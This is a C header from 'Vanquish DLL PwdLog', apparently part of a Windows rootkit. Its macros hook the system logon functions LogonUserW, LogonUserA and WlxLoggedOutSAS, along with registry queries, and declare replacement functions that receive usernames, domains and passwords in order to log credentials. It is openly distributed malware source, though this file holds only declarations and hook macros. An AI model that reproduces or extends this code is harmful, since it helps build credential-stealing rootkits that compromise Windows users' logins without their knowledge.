/******************************************************************************\

	Vanquish DLL PwdLog - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#ifndef __VANQUISH_DLL_PWDLOG__H__
#define __VANQUISH_DLL_PWDLOG__H__

#include "Vanquish_dll.h"
#include <winwlx.h>

#define MAX_GINASZ 256

//default load handlers
#define LOAD_KERNEL32__PWDLOG
#define LOAD_ADVAPI32__PWDLOG \
	INITIAL_REPLACE_API(LogonUserW, ADVAPI32); \
	INITIAL_REPLACE_API(LogonUserA, ADVAPI32);

#define LOAD_USER32__PWDLOG
#define LOAD_GINADLL__PWDLOG \
	INITIAL_REPLACE_API(WlxLoggedOutSAS, GINADLL); \

//default UNload handlers
#define UNLOAD_KERNEL32__PWDLOG
#define UNLOAD_ADVAPI32__PWDLOG \
	FINAL_RESTORE_API(LogonUserW); \
	FINAL_RESTORE_API(LogonUserA);

#define UNLOAD_USER32__PWDLOG
#define UNLOAD_GINADLL__PWDLOG \
	FINAL_RESTORE_API(WlxLoggedOutSAS);

//declaring handlers
#define DECLARE_PWDLOG \
	DECLARE_NEWENTRY(LogonUserW); \
	DECLARE_NEWENTRY(LogonUserA); \
	DECLARE_NEWENTRY(RegOpenKeyExW); \
	DECLARE_NEWENTRY(RegQueryValueExW); \
	DECLARE_NEWENTRY(WlxLoggedOutSAS); \
	WCHAR lpszGina[MAX_GINASZ];

//extern declare
#define EXTERN_PWDLOG \
	EXTERN_NEWENTRY(LogonUserW); \
	EXTERN_NEWENTRY(LogonUserA); \
	EXTERN_NEWENTRY(RegOpenKeyExW); \
	EXTERN_NEWENTRY(RegQueryValueExW); \
	EXTERN_NEWENTRY(WlxLoggedOutSAS); \
	extern WCHAR lpszGina[MAX_GINASZ];

void WINAPI Vanquish_GetGina();

//Vanquish NEW API declarations follows
//Declarations are in conformance with the real Windows API header files
//Difference between this and real api prototypes:
//    1) prefixed V to the name
//    2) replaced WINAPI with NEWAPI

//Original header definitions: (winbase.h)

NEWAPI
BOOL
WINAPI
VLogonUserW(
    LPWSTR lpszUsername,
    LPWSTR lpszDomain,
    LPWSTR lpszPassword,
    DWORD dwLogonType,
    DWORD dwLogonProvider,
    PHANDLE phToken
    );

NEWAPI
WINAPI
VLogonUserA(
    LPSTR lpszUsername,
    LPSTR lpszDomain,
    LPSTR lpszPassword,
    DWORD dwLogonType,
    DWORD dwLogonProvider,
    PHANDLE phToken
    );

NEWAPI
int
WINAPI
VWlxLoggedOutSAS(
    PVOID           pWlxContext,
    DWORD           dwSasType,
    PLUID           pAuthenticationId,
    PSID            pLogonSid,
    PDWORD          pdwOptions,
    PHANDLE         phToken,
    PWLX_MPR_NOTIFY_INFO    pMprNotifyInfo,
    PVOID           *pProfile);

#endif//__VANQUISH_DLL_PWDLOG__H__